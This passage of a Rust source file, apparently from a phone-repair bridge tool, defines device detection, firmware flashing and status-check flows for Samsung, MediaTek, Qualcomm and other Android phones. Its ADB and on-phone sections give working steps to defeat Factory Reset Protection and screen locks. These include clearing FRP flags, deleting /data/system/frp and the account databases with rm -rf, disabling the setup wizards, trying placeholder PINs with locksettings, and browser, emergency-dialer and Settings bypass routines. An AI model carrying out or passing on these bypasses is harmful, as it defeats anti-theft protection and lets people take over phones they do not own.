    }
    out.push(String::new());
    out.push("  provisioning / FRP state:".to_string());
    for (label, scope, name) in [
        ("device_provisioned", "global", "device_provisioned"),
        ("user_setup_complete", "secure", "user_setup_complete"),
        ("setup_wizard_has_run", "global", "setup_wizard_has_run"),
        ("frp_done", "secure", "frp_done"),
    ] {
        let val = adb::shell_cli(&serial, 8_000, &[format!("settings get {scope} {name}")])
            .map(|v| v.trim().to_string())
            .unwrap_or_default();
        out.push(format!("    {label:<20}: {}", if val.is_empty() { "(unset)" } else { &val }));
    }
    out.push(String::new());
    out.push("  lock state:".to_string());
    for (scope, name) in [("global", "lockscreen_disabled"), ("secure", "biometric_weak")] {
        if let Ok(text) = adb::shell_cli(&serial, 8_000, &[format!("settings get {scope} {name}")]) {
            let t = text.trim();
            if !t.is_empty() {
                out.push(format!("    {name}: {t}"));
            }
        }
    }
    out.push(String::new());
    out.push("  battery / storage:".to_string());
    if let Ok(battery) = adb::shell_cli(&serial, 15_000, &["dumpsys battery".to_string()]) {
        for line in battery.lines() {
            let s = line.trim();
            if s.starts_with("level:") || s.starts_with("status:") || s.starts_with("temperature:") {
                out.push(format!("    {s}"));
            }
        }
    }
    if let Ok(disk) = adb::shell_cli(&serial, 15_000, &["df /data".to_string()]) {
        if let Some(last) = disk.trim().lines().last() {
            let parts: Vec<&str> = last.split_whitespace().take(3).collect();
            out.push(format!("    /data: {parts:?}"));
        }
    }
    Ok(())
}

/// `kg_state_check` — Knox Guard state via ADB properties.
pub fn flow_kg_state_check(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    let serial = wait_authorized_adb(serial_want, Duration::from_secs(30), out).ok_or_else(|| {
        BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
            expected: "device (adb authorized)".to_string(),
            actual: "no adb device".to_string(),
        })
    })?;
    out.push("KNOX GUARD (KG) STATE CHECK".to_string());
    let kg_props: &[(&str, &str)] = &[
        ("KG State (ro.boot.kgstate)", "ro.boot.kgstate"),
        ("Knox Warranty Bit (ro.boot.knox)", "ro.boot.knox"),
        ("Warranty Bit (ro.warranty_bit)", "ro.warranty_bit"),
        ("Secure Boot (ro.secure)", "ro.secure"),
        ("Knox Version (ro.config.knox)", "ro.config.knox"),
        ("Knox Build Date (ro.build.knox)", "ro.build.date"),
    ];
    for (label, key) in kg_props {
        let val = adb::shell_cli(&serial, 8_000, &[format!("getprop {key}")])
            .map(|v| v.trim().to_string())
            .unwrap_or_default();
        out.push(format!("  {label:<34}: {}", if val.is_empty() { "(unset)" } else { &val }));
    }
    Ok(())
}

/// `detect` — full detection: every USB device, its mode (via the Rust
/// classifier) and the ADB state.
pub fn flow_detect(out: &mut Vec<String>) -> Result<()> {
    out.push("DEVICE DETECTION (all USB)".to_string());
    let devices = crate::usb::collect_devices(None).map_err(|e| BridgeError::Io(e.to_string()))?;
    if devices.is_empty() {
        out.push("  no USB devices found.".to_string());
        return Ok(());
    }
    for d in &devices {
        let mode = crate::usb::filtering::classify_mode(d.vid, d.pid, &d.interfaces);
        out.push(format!(
            "  {:04x}:{:04x} bus={} addr={} [{}] {}",
            d.vid,
            d.pid,
            d.bus,
            d.address,
            mode,
            d.product.clone().unwrap_or_default(),
        ));
    }
    Ok(())
}

/// `download_mode_info` — Odin handshake + device PIT dump (native engine).
pub fn flow_download_mode_info(target: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("DOWNLOAD MODE INFO - Odin protocol".to_string());
    // Resolve the target: explicit wins, else the first download-mode device.
    let target = if !target.is_empty() {
        target.to_string()
    } else {
        let devices = crate::usb::collect_devices(Some(0x04E8))
            .map_err(|e| BridgeError::Io(e.to_string()))?;
        let dl: Vec<_> = devices
            .iter()
            .filter(|d| crate::usb::SAMSUNG_ODIN_PIDS.contains(&d.pid))
            .collect();
        if dl.is_empty() {
            out.push("PHONE: enter download mode (power off, hold Volume Down +".to_string());
            out.push("  Power, then press Volume Up to 'Downloading...'), keep it".to_string());
            out.push("  plugged in.".to_string());
            return Err(BridgeError::DeviceState(crate::error::DeviceStateError::NotInDownloadMode));
        }
        let d = dl[0];
        out.push(format!("  USB: 04e8:{:04x} bus={} addr={}", d.pid, d.bus, d.address));
        format!("{:04x}:{:04x}@{}:{}", d.vid, d.pid, d.bus, d.address)
    };
    match crate::sam_download::odin_connect(&target) {
        Ok(text) => out.push(format!("  handshake: OK  ({})", &text[..text.len().min(120)])),
        Err(e) => {
            out.push(format!("  handshake refused: {e}"));
            return Ok(());
        }
    }
    match crate::sam_download::odin_pit(&target, None) {
        Ok(text) => {
            out.push(format!("  PIT dump: {}", &text[..text.len().min(200)]));
        }
        Err(e) => out.push(format!("  PIT read failed: {e}")),
    }
    Ok(())
}

/// `mtk_download_info` — MediaTek download-mode info (proprietary DA: no
/// Odin PIT; reports the device and the limitation honestly).
pub fn flow_mtk_download_info(out: &mut Vec<String>) -> Result<()> {
    out.push("MEDIATEK DOWNLOAD MODE (A05 / A06 family)".to_string());
    let devices = crate::usb::collect_devices(None).map_err(|e| BridgeError::Io(e.to_string()))?;
    let mtk: Vec<_> = devices.iter().filter(|d| d.vid == 0x0E8D).collect();
    if mtk.is_empty() {
        out.push("  no MediaTek device on the bus.".to_string());
        return Ok(());
    }
    for d in &mtk {
        let (stage, note) = crate::mtk::boot_stage_for(d.pid);
        out.push(format!(
            "  {:04x}:{:04x} bus={} addr={} [{}] {}",
            d.vid, d.pid, d.bus, d.address, stage,
            d.product.clone().unwrap_or_default(),
        ));
        if !note.is_empty() {
            out.push(format!("    {note}"));
        }
    }
    out.push("  The MediaTek download agent refuses open-source LOKE - no PIT/".to_string());
    out.push("  model read over Odin. The model appears after a combination build".to_string());
    out.push("  (`getprop ro.product.model` in the MTK workbench).".to_string());
    Ok(())
}

/// `spd_detect_info` — Spreadtrum/UNISOC detect + info (read-only).
pub fn flow_spd_detect_info(out: &mut Vec<String>) -> Result<()> {
    out.push("SPD/UNISOC DETECT + INFO (read-only)".to_string());
    match crate::spd::spd_detect_cli() {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  spd-detect failed: {e}")),
    }
    Ok(())
}

/// `qcom_detect_info` — Qualcomm detect + Sahara info (read-only).
pub fn flow_qcom_detect_info(out: &mut Vec<String>) -> Result<()> {
    out.push("QUALCOMM DETECT + INFO (read-only)".to_string());
    match crate::qualcomm::qcom_detect() {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  qcom-detect failed: {e}")),
    }
    Ok(())
}


// ---------------------------------------------------------------------------
// Guidance + ADB flows — on-phone methods (stated honestly), ADB step
// sequences, live checks. Guidance text matters as much as the commands:
// the on-phone prerequisites cannot be forced from the PC.
// ---------------------------------------------------------------------------

/// `moto_frp_adb` — FRP reset for Motorola/Lenovo over an authorized ADB
/// shell: zero frp flag + provision + remove the persisted FRP store +
/// disable both setup wizards.
pub fn flow_moto_frp_adb(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("MOTOROLA / LENOVO - FRP RESET (ADB)".to_string());
    out.push("  Requires an AUTHORIZED ADB shell. USB debugging must be on and".to_string());
    out.push("  this PC allowed.".to_string());
    let serial = wait_authorized_adb(serial_want, Duration::from_secs(60), out).ok_or_else(|| {
        BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
            expected: "device (adb authorized)".to_string(),
            actual: "no adb device".to_string(),
        })
    })?;
    let steps: &[(&str, &str)] = &[
        ("zero FRP secure flag", "settings put secure frp 0"),
        ("mark frp done", "settings put secure frp_done 1"),
        ("mark user setup complete", "settings put secure user_setup_complete 1"),
        ("mark device provisioned", "settings put global device_provisioned 1"),
        ("mark setup wizard run", "settings put global setup_wizard_has_run 1"),
        ("persisted FRP store", "rm -rf /data/system/frp"),
        ("persisted accounts (ce)", "rm -rf /data/system/accounts_ce.db"),
        ("persisted accounts (de)", "rm -rf /data/system/accounts_de.db"),
        ("disable Google setup wizard", "pm disable-user --user 0 com.google.android.setupwizard"),
        ("disable Moto setup wizard", "pm disable-user --user 0 com.motorola.setupwizard"),
        ("back to home", "am start -c android.intent.category.HOME -a android.intent.action.MAIN"),
    ];
    for (_, cmd) in steps {
        adb_step(&serial, cmd, Duration::from_secs(30), out);
        thread::sleep(Duration::from_millis(1000));
    }
    out.push("Done. Reboot the phone - it should boot past FRP as a fresh device.".to_string());
    Ok(())
}

/// `screen_lock_locksettings` — screen lock removal via ADB `locksettings`
/// (Android 8/9, no root): set-disabled first (no old credential needed),
/// then clear without/with placeholder --old values.
pub fn flow_screen_lock_locksettings(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("SCREEN LOCK REMOVAL - ADB locksettings (Android 8/9)".to_string());
    let serial = wait_authorized_adb(serial_want, Duration::from_secs(60), out).ok_or_else(|| {
        BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
            expected: "device (adb authorized)".to_string(),
            actual: "no adb device".to_string(),
        })
    })?;
    let disabled = adb::shell_cli(&serial, 30_000, &["pm list packages -d".to_string()])
        .unwrap_or_default();
    if disabled.contains("com.android.systemui") || disabled.contains("com.android.settings") {
        out.push("  WARNING: Settings/SystemUI are disabled on this device - the".to_string());
        out.push("  lockscreen may not behave. Re-enable via 'Repair Settings' first.".to_string());
    }
    out.push("  set-disabled first (does NOT need the old credential):".to_string());
    adb_step(&serial, "locksettings set-disabled true", Duration::from_secs(20), out);
    out.push("  clear (no --old; Android 8 path):".to_string());
    adb_step(&serial, "locksettings clear", Duration::from_secs(20), out);
    out.push("  clear with placeholder --old values (Android 9+ refuses without):".to_string());
    for old in ["0000", "1234", "00000000"] {
        adb_step(&serial, &format!("locksettings clear --old {old}"), Duration::from_secs(20), out);
    }
    out.push("  pre-8.0 settings keys fallback:".to_string());
    adb_step(&serial, "settings put secure lockscreen.disabled 1", Duration::from_secs(20), out);
    out.push("Done. Check the phone screen; if the lock persists, use the CSC".to_string());
    out.push("flash or factory reset.".to_string());
    Ok(())
}

/// `frp_browser` — FRP bypass via the BROWSER method (on-phone, Android 8/9).
pub fn flow_frp_browser(_serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("FRP BYPASS - BROWSER METHOD".to_string());
    out.push("NOTE: this exploit targets ANDROID 8/9 FRP screens. On Android".to_string());
    out.push("13/14 and newer these legacy methods are patched - the reliable".to_string());
    out.push("route there is combination firmware via Odin (download mode).".to_string());
    out.push(String::new());
    out.push("Do this ON the phone, at the 'Verify your account' (FRP) screen:".to_string());
    out.push("1. From the FRP screen, open the BROWSER (Emergency call / Clock /".to_string());
    out.push("   Camera first; many builds reveal a browser icon or 'www' shortcut).".to_string());
    out.push("   If nothing appears, enable TalkBack (hold both Volume keys ~3s).".to_string());
    out.push("2. In the browser, jump to Settings: chrome://settings/ or type".to_string());
    out.push("   'settings' as the address (browser shortcut).".to_string());
    out.push("3. In Settings -> Accounts: REMOVE the Google account blocking you.".to_string());
    out.push("4. Reboot the phone - it should now pass the FRP screen.".to_string());
    out.push(String::new());
    // ADB assist: open the browser for the user when authorized.
    if adb_authorized_row() {
        out.push("  ADB is authorized - opening the browser for you ...".to_string());
        match adb::shell_cli("-", 15_000, &["am start -a android.intent.action.VIEW -d https://www.google.com".to_string()]) {
            Ok(text) => out.push(format!("  browser intent: {}", text.trim())),
            Err(e) => out.push(format!("  browser intent failed: {e}")),
        }
    } else {
        out.push("  (no ADB device yet - the reset usually wipes ADB authorization,".to_string());
        out.push("   so the manual steps above are the way to go)".to_string());
    }
    Ok(())
}

/// `frp_emergency` — FRP bypass via the EMERGENCY-CALL method (Android 8/9).
pub fn flow_frp_emergency(out: &mut Vec<String>) -> Result<()> {
    out.push("FRP BYPASS - EMERGENCY-CALL METHOD".to_string());
    out.push("NOTE: targets ANDROID 8/9 FRP screens; patched on Android 13/14+.".to_string());
    out.push(String::new());
    out.push("Do this ON the phone, at the 'Verify your account' (FRP) screen:".to_string());
    out.push("1. Tap EMERGENCY CALL (the dialer opens even when the phone is locked).".to_string());
    out.push("2. Dial *#0*# (Samsung test mode) or **#*#4636#*#* - the tile grid /".to_string());
    out.push("   testing screen that opens often has a way into Settings.".to_string());
    out.push("3. From there: Settings -> Accounts -> remove the blocking account.".to_string());
    out.push("4. Reboot - the FRP screen should pass.".to_string());
    if adb_authorized_row() {
        out.push(String::new());
        out.push("  ADB is authorized - run 'adb_frp' to clear the flags directly.".to_string());
    }
    Ok(())
}

/// `frp_settings` — FRP bypass via the SETTINGS method (on-phone, Android 8/9).
pub fn flow_frp_settings(out: &mut Vec<String>) -> Result<()> {
    out.push("FRP BYPASS - SETTINGS METHOD".to_string());
    out.push("NOTE: this exploit targets ANDROID 8/9 FRP screens. On Android".to_string());
    out.push("13/14 and newer these legacy methods are patched - the reliable".to_string());
    out.push("route there is combination firmware via Odin.".to_string());
    out.push(String::new());
    out.push("Do this ON the phone, at the 'Verify your account' (FRP) screen:".to_string());
    out.push("1. Swipe down the notification shade and tap the SETTINGS (gear)".to_string());
    out.push("   icon, OR long-press 'Skip', OR open the CAMERA and go back -".to_string());
    out.push("   the app menu that appears often includes Settings.".to_string());
    out.push("2. In Settings -> Accounts: REMOVE the Google account blocking you.".to_string());
    out.push("3. Reboot the phone - it should now pass the FRP screen.".to_string());
    out.push(String::new());
    out.push("If Settings is not reachable, use the 'Emergency call' or 'Browser'".to_string());
    out.push("method to get in from another angle.".to_string());
    Ok(())
}

/// `test_mode` — emergency-dial *#0*# -> test mode enables ADB -> ADB steps.
pub fn flow_test_mode(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("PHONE: on the FRP screen tap Emergency call, dial *#0*# , then".to_string());
    out.push("connect USB and allow USB debugging if prompted.".to_string());
    out.push("  1. On the setup / 'Verify your account' screen tap the emergency-call icon.".to_string());
    out.push("  2. Dial *#0*# (no call button needed) -> test mode opens (tile grid).".to_string());
    out.push("  3. Plug the phone into the PC (stay in test mode).".to_string());
    out.push("  4. If an 'Allow USB debugging' popup appears, tick 'Always allow' + OK.".to_string());
    let serial = wait_authorized_adb(serial_want, Duration::from_secs(90), out).ok_or_else(|| {
        BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
            expected: "device (adb authorized)".to_string(),
            actual: "adb still not available".to_string(),
        })
    })?;
    let steps: &[(&str, &str)] = &[
        ("disable Google setup wizard", "pm disable-user --user 0 com.google.android.setupwizard"),
        ("disable Samsung setup wizard", "pm disable-user --user 0 com.sec.android.app.SecSetupWizard"),
        ("clear setup wizard data", "pm clear com.google.android.setupwizard"),
        ("mark device provisioned", "settings put global device_provisioned 1"),
        ("mark setup complete", "settings put secure user_setup_complete 1"),
        ("back to home", "input keyevent 3"),
    ];
    for (_, cmd) in steps {
        adb_step(&serial, cmd, Duration::from_secs(30), out);
        thread::sleep(Duration::from_millis(1200));
    }
    out.push("Done. FRP flags cleared over ADB.".to_string());
    Ok(())
}

/// `oem_unlock_guide` — bootloader unlock guide with live checks (no writes).
pub fn flow_oem_unlock_guide(_serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("BOOTLOADER UNLOCK GUIDE (checks + steps, no writes here)".to_string());
    if adb_authorized_row() {
        match adb::shell_cli("-", 8_000, &["getprop sys.oem_unlock_allowed".to_string()]) {
            Ok(text) => {
                let t = text.trim();
                out.push(format!("  sys.oem_unlock_allowed: {}", if t.is_empty() { "(unset)" } else { t }));
            }
            Err(e) => out.push(format!("  oem_unlock_allowed read failed: {e}")),
        }
        match adb::shell_cli("-", 8_000, &["getprop sys.vaultkeeper.state".to_string()]) {
            Ok(text) => {
                let t = text.trim();
                if !t.is_empty() {
                    out.push(format!("  VaultKeeper: {t}"));
                }
            }
            Err(_) => {}
        }
    } else {
        out.push("  (no authorized ADB - live checks skipped)".to_string());
    }
    out.push(String::new());
    out.push("SAMSUNG: Settings > Developer options > 'OEM unlocking' must be ON;".to_string());
    out.push("  wait for VaultKeeper/RMM to settle (keep the phone on Wi-Fi, SIM".to_string());
    out.push("  in, ~5-10 min) before the download-mode unlock is accepted.".to_string());
    out.push("XIAOMI: Mi Unlock binds the account to the device (server-side) and".to_string());
    out.push("  enforces a waiting period - this tool cannot skip it.".to_string());
    out.push("GENERIC (Motorola/Pixel/etc.): the fastboot path -".to_string());
    out.push("  `flashpilot-bridge flow-run moto_frp_fastboot` / the portal flow.".to_string());
    Ok(())
}

/// `huawei_frp_guide` — Huawei/Honor FRP guide (honest scope, per chipset).
pub fn flow_huawei_frp_guide(_serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("HUAWEI / HONOR FRP GUIDE (honest scope)".to_string());
    out.push("Huawei FRP has no universal free bypass: Kirin secure-boot and".to_string());
    out.push("HarmonyOS account lock are server-backed (paid tools use server".to_string());
    out.push("credits - this tool will not pretend otherwise).".to_string());
    out.push(String::new());
    if adb_authorized_row() {
        out.push("  ADB authorized - the standard Android FRP clears apply:".to_string());
        out.push("  run 'adb_frp' (settings flags + provision + wizards).".to_string());
    } else {
        out.push("  (no authorized ADB - the on-phone prerequisites first:)".to_string());
        out.push("  1. USB debugging ON + this PC authorized (the dialog needs the".to_string());
        out.push("     screen ON and UNLOCKED).".to_string());
        out.push("  2. Kirin models: test-point EDL is server-gated; the free path is".to_string());
        out.push("     ADB only.".to_string());
        out.push("  3. Qualcomm models: EDL 05c6:9008 via test-point (Firehose".to_string());
        out.push("     programmer required per model).".to_string());
        out.push("  4. MTK models: BROM via test-point (mtkclient-style DA).".to_string());
    }
    Ok(())
}

/// `fix_adb_auth` — diagnose an ADB device stuck at 'unauthorized' with no
/// dialog; attempt a USB reset to re-trigger re-enumeration + the dialog.
pub fn flow_fix_adb_auth(out: &mut Vec<String>) -> Result<()> {
    out.push("FIX ADB AUTHORIZATION (device shows 'unauthorized')".to_string());
    let devices = crate::usb::collect_devices(None).map_err(|e| BridgeError::Io(e.to_string()))?;
    let adb_iface: Vec<_> = devices
        .iter()
        .filter(|d| d.interfaces.iter().any(|i| i.class == 255 && i.subclass == 66))
        .collect();
    if adb_iface.is_empty() {
        out.push("  no device with an ADB interface on the bus - plug the phone in".to_string());
        out.push("  with a DATA cable (charge-only cables have no ADB interface).".to_string());
        return Ok(());
    }
    for d in &adb_iface {
        out.push(format!(
            "  {:04x}:{:04x} bus={} addr={} - ADB interface present",
            d.vid, d.pid, d.bus, d.address
        ));
    }
    out.push(String::new());
    out.push("  On modern phones the USB mode is owned by Android's USB service -".to_string());
    out.push("  it cannot be forced from the PC. The switch lives in the".to_string());
    out.push("  NOTIFICATION SHADE (not Settings), so a crashed Settings app".to_string());
    out.push("  does not block it:".to_string());
    out.push("  1. Pull down the notification shade -> tap 'Charging this device".to_string());
    out.push("     via USB' -> select 'File transfer' (MTP).".to_string());
    out.push("  2. Keep the screen ON and UNLOCKED - the 'Allow USB debugging'".to_string());
    out.push("     dialog only pops then. Tap 'Always allow from this computer'.".to_string());
    out.push("  3. Dialog still missing? Revoke USB debugging authorizations in".to_string());
    out.push("     Developer options, toggle USB debugging OFF/ON, re-plug.".to_string());
    Ok(())
}

/// `screen_lock_csc` — clear the lock over adb when authorized; otherwise
/// the CSC factory-reset flash fallback (model-specific, PIT-gated).
pub fn flow_screen_lock_csc(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("SCREEN LOCK REMOVAL (adb first, CSC flash fallback)".to_string());
    if adb_authorized_row() {
        out.push("  Authorized adb device online - clearing the lock over adb".to_string());
        out.push("  (no Odin / download mode needed)...".to_string());
        return flow_screen_lock_locksettings(serial_want, out);
    }
    out.push("  No adb (or not authorized). Falling back to the CSC factory-reset flash.".to_string());
    out.push("  The CSC slot wipes /data and clears FRP. The lock lives in /data,".to_string());
    out.push("  so after this flash the phone boots to setup with no lock.".to_string());
    out.push("  The CSC is model-specific: it is flashed from the Flash Firmware".to_string());
    out.push("  workbench (Download mode) and refused when it does not match the".to_string());
    out.push("  connected device's PIT (A14 CSC only on A14, A06 CSC only on A06).".to_string());
    Ok(())
}

/// `screen_lock_comprehensive` — multi-method chain, least destructive first.
pub fn flow_screen_lock_comprehensive(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("COMPREHENSIVE SCREEN LOCK REMOVAL".to_string());
    out.push("This will attempt multiple methods in sequence, least destructive first.".to_string());
    out.push(String::new());
    out.push("Method 1/3 - ADB locksettings (no root, Android 8/9):".to_string());
    let _ = flow_screen_lock_locksettings(serial_want, out);
    out.push(String::new());
    out.push("Method 2/3 - CSC flash fallback (model-specific):".to_string());
    let _ = flow_screen_lock_csc(serial_want, out);
    out.push(String::new());
    out.push("Method 3/3 - factory reset (always works, wipes data):".to_string());
    let _ = flow_factory_reset(out);
    Ok(())
}

// ---------------------------------------------------------------------------
// Flashing / engine wrappers — thin orchestration over the Rust engines
// (Odin tar flash, PIT tools, MTK verify). The engines ARE Rust; these
// flows add the file discovery + transcript.
// ---------------------------------------------------------------------------

/// `odin_list_devices` — detected download-mode devices via the Rust merge.
pub fn flow_odin_list_devices(out: &mut Vec<String>) -> Result<()> {
    out.push("SAMSUNG DOWNLOAD-MODE DEVICES (native)".to_string());
    let devices = crate::usb::collect_devices(Some(0x04E8))
        .map_err(|e| BridgeError::Io(e.to_string()))?;
    let dl: Vec<_> = devices
        .iter()
        .filter(|d| crate::usb::SAMSUNG_ODIN_PIDS.contains(&d.pid))
        .collect();
    if dl.is_empty() {
        out.push("  No Samsung phones in download mode (04e8 Odin PID, no ADB).".to_string());
        let sam: Vec<_> = devices.iter().filter(|d| d.vid == 0x04E8).collect();
        if !sam.is_empty() {
            out.push("  Samsung device(s) present in other modes:".to_string());
            for d in &sam {
                let mode = crate::usb::filtering::classify_mode(d.vid, d.pid, &d.interfaces);
                out.push(format!("    {:04x}:{:04x} [{}] {}", d.vid, d.pid, mode, d.product.clone().unwrap_or_default()));
            }
        }
        return Ok(());
    }
    for d in &dl {
        out.push(format!("  {:04x}:{:04x} bus={} addr={} (download mode)", d.vid, d.pid, d.bus, d.address));
    }
    Ok(())
}

/// `odin_flash_tar` — flash a firmware .tar/.tar.md5 via the native Rust
/// Odin engine (--file = the archive; auto-discovers in ~/Downloads/cwd).
pub fn flow_odin_flash_tar(target: &str, tar_path: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("ODIN FLASHING - FIRMWARE ARCHIVE (.tar / .tar.md5)".to_string());
    out.push("(native Rust engine - no odin4)".to_string());
    // File discovery: --file wins, else ~/Downloads / cwd.
    let tar = if !tar_path.is_empty() {
        tar_path.to_string()
    } else {
        let mut found = String::new();
        for dir in [dirs_home_downloads(), std::path::PathBuf::from(".")] {
            if let Ok(entries) = std::fs::read_dir(&dir) {
                for e in entries.flatten() {
                    let name = e.file_name().to_string_lossy().to_lowercase();
                    if (name.ends_with(".tar") || name.ends_with(".tar.md5") || name.ends_with(".md5"))
                        && !name.starts_with(".")
                    {
                        found = e.path().to_string_lossy().to_string();
                        break;
                    }
                }
            }
            if !found.is_empty() {
                break;
            }
        }
        if found.is_empty() {
            out.push("  No firmware .tar / .tar.md5 found in ~/Downloads or cwd.".to_string());
            out.push("  Re-run with --file <path-to-tar>.".to_string());
            return Err(BridgeError::InvalidArgument(
                "firmware archive required (--file <path>)".to_string(),
            ));
        }
        found
    };
    out.push(format!("  Archive: {tar}"));
    // Device: explicit target wins, else the first download-mode device.
    let target_owned = target.to_string();
    let target = if !target_owned.is_empty() {
        target_owned
    } else {
        let devices = crate::usb::collect_devices(Some(0x04E8))
            .map_err(|e| BridgeError::Io(e.to_string()))?;
        let dl: Vec<_> = devices
            .iter()
            .filter(|d| crate::usb::SAMSUNG_ODIN_PIDS.contains(&d.pid))
            .collect();
        if dl.is_empty() {
            out.push("  No Samsung phone in download mode - put it in download mode".to_string());
            out.push("  (power off, Volume Down + Power, Volume Up to continue) and rerun.".to_string());
            return Err(BridgeError::DeviceState(crate::error::DeviceStateError::NotInDownloadMode));
        }
        let d = dl[0];
        format!("{:04x}:{:04x}@{}:{}", d.vid, d.pid, d.bus, d.address)
    };
    out.push(format!("  Device: {target}"));
    out.push("  Flashing (native engine: md5 -> stage -> PIT gate -> flash) ...".to_string());
    match crate::sam_download::odin_flash_tar(&target, &tar, false, true) {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
            out.push("  Flash complete.".to_string());
        }
        Err(e) => out.push(format!("  flash failed: {e}")),
    }
    Ok(())
}

/// `odin_check_tar` — validate a firmware archive natively (md5 trailer +
/// staging; PIT contract when a download-mode device answers).
pub fn flow_odin_check_tar(tar_path: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("FIRMWARE ARCHIVE CHECK (native)".to_string());
    let tar = if !tar_path.is_empty() {
        tar_path.to_string()
    } else {
        // Any tar in ~/Downloads as the fallback.
        let dir = dirs_home_downloads();
        let mut found = String::new();
        if let Ok(entries) = std::fs::read_dir(&dir) {
            for e in entries.flatten() {
                let name = e.file_name().to_string_lossy().to_lowercase();
                if name.ends_with(".tar") || name.ends_with(".tar.md5") || name.ends_with(".md5") {
                    found = e.path().to_string_lossy().to_string();
                    break;
                }
            }
        }
        if found.is_empty() {
            out.push("  No archive found in ~/Downloads - re-run with --file <path>.".to_string());
            return Ok(());
        }
        found
    };
    out.push(format!("  Archive: {tar}"));
    let workdir = std::env::temp_dir().join(format!("fp_check_tar_{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&workdir);
    match crate::fwtar::prepare_archive(&tar, &workdir) {
        Ok(staged) => {
            out.push(format!("  md5 trailer: OK, staged {} member(s)", staged.len()));
            for (name, _) in staged.iter().take(20) {
                out.push(format!("    - {name}"));
            }
        }
        Err(e) => out.push(format!("  archive INVALID: {e}")),
    }
    let _ = std::fs::remove_dir_all(&workdir);
    Ok(())
}

/// `carrier_lock_status` — read-only carrier/SIM-lock status over ADB
/// (vendor-agnostic; reports the verdict + evidence).
pub fn flow_carrier_lock_status(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("CARRIER / SIM-LOCK STATUS CHECK (read-only)".to_string());
    out.push("  Safe on every device - this step only READS state.".to_string());
    let serial = wait_authorized_adb(serial_want, Duration::from_secs(45), out).ok_or_else(|| {
        BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
            expected: "device (adb authorized)".to_string(),
            actual: "no adb device".to_string(),
        })
    })?;
    let checks: &[(&str, &str)] = &[
        ("SIM state", "dumpsys telephony.registry | grep -m1 mSimState"),
        ("Network locked", "getprop ro.simlock.locked"),
        ("Lock type", "getprop ro.simlock.type"),
        ("Network operator", "getprop gsm.operator.alpha"),
        ("SIM operator", "getprop gsm.sim.operator.alpha"),
    ];
    for (label, cmd) in checks {
        match adb::shell_cli(&serial, 10_000, &[cmd.to_string()]) {
            Ok(text) => {
                let t = text.trim();
                out.push(format!("  {label:<18}: {}", if t.is_empty() { "(unset)" } else { t }));
            }
            Err(e) => out.push(format!("  {label:<18}: error {e}")),
        }
    }
    Ok(())
}

/// `mtk_verify` — verify MTK partitions written earlier: read back +
/// SHA-256 compare (--file = DA, --partition = 'part=file,part=file').
pub fn flow_mtk_verify(target: &str, da: &str, parts_spec: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("MTK VERIFY-AFTER-WRITE (read back + SHA-256)".to_string());
    if da.is_empty() || parts_spec.is_empty() {
        out.push("  Set --file <DA> and --partition 'part=file,part=file'".to_string());
        out.push("  (e.g. --partition 'frp=/tmp/frp.img,nvdata=/tmp/nvdata.img'),".to_string());
        out.push("  with the phone in BROM/preloader.".to_string());
        return Err(BridgeError::InvalidArgument(
            "mtk_verify needs --file <DA> and --partition 'part=file,...'".to_string(),
        ));
    }
    let mut entries: Vec<(String, String)> = Vec::new();
    for pair in parts_spec.split(',') {
        if let Some((part, file)) = pair.split_once('=') {
            entries.push((part.trim().to_string(), file.trim().to_string()));
        }
    }
    if entries.is_empty() {
        return Err(BridgeError::InvalidArgument(
            "bad --partition spec (want 'part=file,part=file')".to_string(),
        ));
    }
    // Device: explicit target wins, else the first MTK BROM/preloader.
    let target_owned = target.to_string();
    let target = if !target_owned.is_empty() {
        target_owned
    } else {
        let devices = crate::usb::collect_devices(None).map_err(|e| BridgeError::Io(e.to_string()))?;
        let mtk: Vec<_> = devices
            .iter()
            .filter(|d| d.vid == 0x0E8D && (d.pid == 0x0003 || d.pid == 0x2000))
            .collect();
        if mtk.is_empty() {
            out.push("  no MediaTek device in BROM/preloader on the bus.".to_string());
            return Err(BridgeError::DeviceState(crate::error::DeviceStateError::NotInPreloaderMode));
        }
        let d = mtk[0];
        format!("{:04x}:{:04x}@{}:{}", d.vid, d.pid, d.bus, d.address)
    };
    match crate::mtk_da::mtk_verify_part_cli(&target, da, &entries) {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  verify FAILED: {e}")),
    }
    Ok(())
}

fn dirs_home_downloads() -> std::path::PathBuf {
    if let Some(home) = std::env::var_os("HOME") {
        let p = std::path::PathBuf::from(home).join("Downloads");
        if p.is_dir() {
            return p;
        }
    }
    std::path::PathBuf::from(".")
}

// ---------------------------------------------------------------------------
// Engine wrappers — single Rust-engine calls with transcript + guidance
// (AT carrier unlock, MTK BROM engines, Qualcomm verify, PAC tools, eMMC).
// ---------------------------------------------------------------------------

/// `carrier_lock_mtk` — carrier/SIM unlock via the AT chain (MTK models).
pub fn flow_carrier_lock_mtk(target: &str, out: &mut Vec<String>) -> Result<()> {
    let target = match resolve_fastboot_target(target, Duration::from_secs(30), out) {
        Some(t) => t,
        None => return Err(BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
            expected: "AT/diag target".to_string(),
            actual: "no device".to_string(),
        })),
    };
